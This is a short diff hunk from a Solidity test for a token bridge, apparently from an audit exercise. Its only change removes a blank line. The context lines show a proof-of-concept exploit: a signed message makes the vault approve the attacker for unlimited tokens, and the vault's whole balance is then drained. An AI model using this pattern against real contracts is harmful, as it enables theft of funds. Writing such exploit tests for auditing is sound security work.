@@ -300,7 +300,6 @@ contract L1BossBridgeTest is Test {
             abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
         );
         (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
-
         tokenBridge.sendToL1(v, r, s, message);
         assertEq(token.allowance(address(vault), attacker), type(uint256).max);
         token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
